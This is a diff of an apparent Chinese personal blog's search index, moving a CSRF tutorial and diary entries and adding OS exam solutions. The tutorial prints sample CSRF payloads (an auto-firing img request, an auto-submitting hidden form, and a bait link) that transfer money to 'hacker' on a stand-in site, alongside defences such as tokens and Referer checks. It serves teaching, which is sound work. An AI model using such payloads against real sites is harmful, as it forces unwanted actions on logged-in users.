@@ -71,57 +71,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CSRF跨站请求伪造</title>
-    <url>/2022/12/06/CSRF/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF似乎和XSS有些关联，但也有不同之处。</p>
-<span id="more"></span>
-<h1 id="CSRF-概述"><a href="#CSRF-概述" class="headerlink" title="CSRF 概述"></a>CSRF 概述</h1><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对<strong>指定网站的信任</strong>，<strong>CSRF</strong> 利用的是网站对<strong>用户网页浏览器的信任</strong>。</p>
-<h1 id="CSRF-攻击原理"><a href="#CSRF-攻击原理" class="headerlink" title="CSRF 攻击原理"></a>CSRF 攻击原理</h1><p><img src="/simg/CSRF_1.png" alt="CSRF攻击原理"></p>
-<ol>
-<li>用户输入账号信息请求登录A网站。</li>
-<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
-<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
-<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
-<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客便可尝试进行目标操作。<br>两个条件：</li>
-</ol>
-<ul>
-<li>用户访问站点A并产生了cookie</li>
-<li>用户没有退出A并且访问了站点B</li>
-</ul>
-<h1 id="CSRF-类型"><a href="#CSRF-类型" class="headerlink" title="CSRF 类型"></a>CSRF 类型</h1><h2 id="HTTP-GET-型"><a href="#HTTP-GET-型" class="headerlink" title="HTTP GET 型"></a>HTTP GET 型</h2><p>这类攻击非常简单，只需要一个HTTP请求：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://a.com/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
-<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>http://a.com</code> 发出一次HTTP请求。<code>http://a.com</code> 就会收到包含受害者登录信息的一次跨域请求。</p>
-<h2 id="HTTP-POST型"><a href="#HTTP-POST型" class="headerlink" title="HTTP POST型"></a>HTTP POST型</h2><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;airing&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上。</p>
-<h2 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h2><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://a.com/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"> 屠龙宝刀，点击就送！ </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-<p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个页面，则表示攻击成功。</p>
-<h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><ol>
-<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
-<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</li>
-<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
-</ol>
-<h2 id="使用burp快速生成CSRF-poc"><a href="#使用burp快速生成CSRF-poc" class="headerlink" title="使用burp快速生成CSRF poc"></a>使用burp快速生成CSRF poc</h2><p>当我们发现一个页面存在CSRF漏洞后，可以通过burp快速生成攻击代码<br><img src="/simg/csrf_2.png" alt=" "><br>点击复制html ，然后保存在本地<br><img src="/simg/csrf_3.png" alt=" "><br>双击打开，当受害者点击就执行了我们的CSRF代码<br><img src="/simg/csrf_4.png" alt=" "></p>
-<h1 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h1><h2 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h2><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
-<h2 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h2><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
-<h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><p>二次验证，就是在转账等关键操作之前提供当前用户的密码或验证码。可有效防御CSRF攻击。</p>
-<h2 id="令牌同步模式"><a href="#令牌同步模式" class="headerlink" title="令牌同步模式"></a>令牌同步模式</h2><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（英语：token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子【英语：random seed】的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。<br>Django框架默认带有STP功能：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>渲染后的效果如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrfmiddlewaretoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（英语：session）等级的令牌代替的话，服务器的负担将没有那么重。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有很多内容没写，一些是因为现在用不到，一些是看不懂，等以后知识丰富了再来补充吧~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a><br><a href="https://zhuanlan.zhihu.com/p/398601816">Web漏洞之CSRF</a></p>
-]]></content>
-      <categories>
-        <category>CSRF</category>
-      </categories>
-      <tags>
-        <tag>CSRF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTFHUB-find_it</title>
     <url>/2022/12/15/CTFHUB-find_it/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要自己的后台扫描工具，手工尝试太慢了…</p>
@@ -185,6 +134,80 @@
       </tags>
   </entry>
   <entry>
+    <title>CSRF跨站请求伪造</title>
+    <url>/2022/12/06/CSRF/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF似乎和XSS有些关联，但也有不同之处。</p>
+<span id="more"></span>
+<h1 id="CSRF-概述"><a href="#CSRF-概述" class="headerlink" title="CSRF 概述"></a>CSRF 概述</h1><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对<strong>指定网站的信任</strong>，<strong>CSRF</strong> 利用的是网站对<strong>用户网页浏览器的信任</strong>。</p>
+<h1 id="CSRF-攻击原理"><a href="#CSRF-攻击原理" class="headerlink" title="CSRF 攻击原理"></a>CSRF 攻击原理</h1><p><img src="/simg/CSRF_1.png" alt="CSRF攻击原理"></p>
+<ol>
+<li>用户输入账号信息请求登录A网站。</li>
+<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
+<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
+<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
+<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客便可尝试进行目标操作。<br>两个条件：</li>
+</ol>
+<ul>
+<li>用户访问站点A并产生了cookie</li>
+<li>用户没有退出A并且访问了站点B</li>
+</ul>
+<h1 id="CSRF-类型"><a href="#CSRF-类型" class="headerlink" title="CSRF 类型"></a>CSRF 类型</h1><h2 id="HTTP-GET-型"><a href="#HTTP-GET-型" class="headerlink" title="HTTP GET 型"></a>HTTP GET 型</h2><p>这类攻击非常简单，只需要一个HTTP请求：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://a.com/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>http://a.com</code> 发出一次HTTP请求。<code>http://a.com</code> 就会收到包含受害者登录信息的一次跨域请求。</p>
+<h2 id="HTTP-POST型"><a href="#HTTP-POST型" class="headerlink" title="HTTP POST型"></a>HTTP POST型</h2><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;airing&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上。</p>
+<h2 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h2><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://a.com/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"> 屠龙宝刀，点击就送！ </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个页面，则表示攻击成功。</p>
+<h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><ol>
+<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
+<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</li>
+<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
+</ol>
+<h2 id="使用burp快速生成CSRF-poc"><a href="#使用burp快速生成CSRF-poc" class="headerlink" title="使用burp快速生成CSRF poc"></a>使用burp快速生成CSRF poc</h2><p>当我们发现一个页面存在CSRF漏洞后，可以通过burp快速生成攻击代码<br><img src="/simg/csrf_2.png" alt=" "><br>点击复制html ，然后保存在本地<br><img src="/simg/csrf_3.png" alt=" "><br>双击打开，当受害者点击就执行了我们的CSRF代码<br><img src="/simg/csrf_4.png" alt=" "></p>
+<h1 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h1><h2 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h2><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
+<h2 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h2><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
+<h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><p>二次验证，就是在转账等关键操作之前提供当前用户的密码或验证码。可有效防御CSRF攻击。</p>
+<h2 id="令牌同步模式"><a href="#令牌同步模式" class="headerlink" title="令牌同步模式"></a>令牌同步模式</h2><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（英语：token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子【英语：random seed】的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。<br>Django框架默认带有STP功能：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>渲染后的效果如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrfmiddlewaretoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（英语：session）等级的令牌代替的话，服务器的负担将没有那么重。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有很多内容没写，一些是因为现在用不到，一些是看不懂，等以后知识丰富了再来补充吧~</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a><br><a href="https://zhuanlan.zhihu.com/p/398601816">Web漏洞之CSRF</a></p>
+]]></content>
+      <categories>
+        <category>CSRF</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>惜</title>
+    <url>/2022/11/06/Diary_1106/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
+<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
+<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
+<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
+<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
+<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>日志</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>锦瑟</title>
     <url>/2022/11/05/Diary_1105/</url>
     <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
@@ -206,29 +229,6 @@
 </li>
 </ol>
 <h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-        <tag>日志</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>惜</title>
-    <url>/2022/11/06/Diary_1106/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
-<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
-<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
-<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
-<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
-<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -950,6 +950,139 @@
       </tags>
   </entry>
   <entry>
+    <title>OS习题解析</title>
+    <url>/2022/12/08/OS%E4%B9%A0%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为快到期末考试了，所以需要好好复习，争取考高分吧。</p>
+<span id="more"></span>
+<h1 id="习题解析"><a href="#习题解析" class="headerlink" title="习题解析"></a>习题解析</h1><ul>
+<li>说明：</li>
+</ul>
+<ol>
+<li>不是全部题，只写本人不会的以及需要思考的题。</li>
+<li>选择题不写选项，因为懒</li>
+<li>试卷来源于打印店</li>
+</ol>
+<h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><ol>
+<li><p>若处理器有32位地址，则它的虚拟地址空间为（）字节。<br>解析：<br>虚拟地址对应于物理存储空间的大小，因而可以虚拟出看起来很大的内存空间，这里虚拟地址的地址结构是：<br>31—页号—12—位移量w—0,这里的地址长度正好是操作系统的内存位数，所以可以知道最大寻址为2的32次方b,对应于kb,mb,gb的换算式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2^10b = 1kb</span><br><span class="line">2^20b = 1mb = 1kb*2^10</span><br><span class="line">2^30b = 1gb = 1mb*2^10</span><br><span class="line">这里2^32 = 2^2*1gb  = 4gb</span><br><span class="line">答案：4GB，选B</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>支持程序浮动的地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
+</li>
+<li><p>UNIX中的文件系统采用（）<br>解析：<br>按逻辑结构划分，Unix中的文件系统采用流式文件；而按物理结构划分，则是索引文件。<br>答案：流式文件，选D</p>
+</li>
+<li><p>段页式管理每取一数据，要访问（）次内存。<br>解析：<br>一般需要访问3次以上的内存：<br>第1次是由段表地址寄存器得段表始址后访问段表，由此取出对应段的页表在内存中的地址。<br>第2次则是访问页表得到所要访问的物理地址。<br>第3次才能访问真正需要访问的物理单元。<br>答案：3，选C</p>
+</li>
+<li><p>文件系统的主要目的是（）<br>解析：<br>文件系统是操作系统用来组织和管理存储设备或磁盘分区上的文件的数据结构和方法；即在存储设备上组织和 管理文件 的方法。 操作系统中负 责管理和存储文件信息的软件机构即为文件管理系统，简称为“文件系统”。文件系统主要由三部分组成：文件系统接口，对对象操纵还有管理的软件集合，对象及属性。<br>从操作系统的角度来看，文件系统是对文件存储设备的空间进行组织、分配，负责文件存储并且对存入的文件进行保护和检索的系统。<br>答案：实现对文件的按名存取，选A</p>
+</li>
+<li><p>某基于动态分区存储管理的计算机，其主存容量为55MB (初始为空闲)，采用最佳适配(Best Fit)算法，分配和释放的顺序为 ： 分配15MB ，分配30MB，释放15MB，分配8MB，分配6MB ，此时主存中最大空闲分区的大小是()<br>解析：<br>最佳适应算法（BF）：每次为作业分配内存时总是把能满足要求又是最小的空闲分区分配给作业。<br>其主存容量为55mb(初试为空间)，<br>第一步分配15MB以后还有55MB－15MB＝40MB，<br>第二步分配30MB以后还有 40MB－30MB＝10MB，<br>第三步释放15MB以后有两个空闲区15MB，10MB，<br>第四步分配8MB，则空闲区为15MB，2MB，<br>第五步分配 6MB，则空闲区为9MB，2MB。<br>答案：9MB，选B</p>
+</li>
+<li><p>设计批处理多道系统时，首先要考虑的是（）<br>解析：<br>多道批处理系统：<br>优点：资源利用率大幅提升，系统吞吐量增大<br>缺点：用户响应时间长，没有交互功能。<br>答案：系统效率和吞吐量，选B</p>
+</li>
+<li><p>进程调度的对象和任务分别是（）<br>解析：<br>CPU调度与执行的基本对象应该为线程。而不是作业。没有从后备作业中选定调度策略上CPU这种说法，进程应该是从就绪状态通过分配内存并调度进入CPU执行状态的。<br>答案：进程，从就绪队列中按一定的调度策略选择一个作业占用CPU。 选C</p>
+</li>
+<li><p>一种既有利于短小作业又兼顾到长作业的作业调度算法是（）<br>解析：<br>最高响应比优先算法等待时间相同时，要求服务时间愈短，优先权愈高，因而该算法有利于短作业；<br>对于长作业，作业的优先级可以随等待时间的增加而提高，当其等待时间足够长时，其优先级便可升到很高，从而获得处理机。<br>因此该算法即有利于短作业又兼顾到了长作业。<br>答案：最高响应比优先，选C</p>
+</li>
